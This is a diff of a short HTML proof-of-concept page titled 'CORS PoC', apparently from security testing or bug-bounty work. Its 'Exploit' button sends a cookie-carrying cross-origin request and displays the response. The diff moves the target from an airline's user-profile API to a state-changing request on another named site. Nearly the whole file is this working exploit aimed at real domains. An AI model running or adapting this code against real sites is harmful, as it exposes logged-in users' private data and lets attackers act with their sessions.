@@ -1,22 +1,25 @@
 <html>
-     <body>
-         <h2>CORS PoC</h2>
-         <div id="demo">
-             <button type="button" onclick="cors()">Exploit</button>
-         </div>
-         <script>
-             function cors() {
-             var xhr = new XMLHttpRequest();
-             xhr.onreadystatechange = function() {
-                 if (this.readyState == 4 && this.status == 200) {
-                 document.getElementById("demo").innerHTML = alert(this.responseText);
-                 }
-             };
-              xhr.open("GET",
-                       "http://aeromexico.com//api/v4/profile/user-profile", true);
-             xhr.withCredentials = true;
-             xhr.send();
-             }
-         </script>
-     </body>
- </html>
+  <body>
+    <h2>CORS PoC</h2>
+    <div id="demo">
+      <button type="button" onclick="cors()">Exploit</button>
+    </div>
+    <script>
+      function cors() {
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function () {
+          if (this.readyState == 4 && this.status == 200) {
+            document.getElementById("demo").innerHTML = alert(this.responseText);
+          }
+        };
+        xhr.open(
+          "GET",
+          "https://quitplan.ycq2.org/api/slips?_method=PUT&time=Mon+Dec+23+2024+23%3a48%3a18+GMT-0800+%28Pacific+Standard+Time%29&note=&tz=-08%3a00&newTrigger=",
+          true
+        );
+        xhr.withCredentials = true; // Include cookies in the request
+        xhr.send();
+      }
+    </script>
+  </body>
+</html>
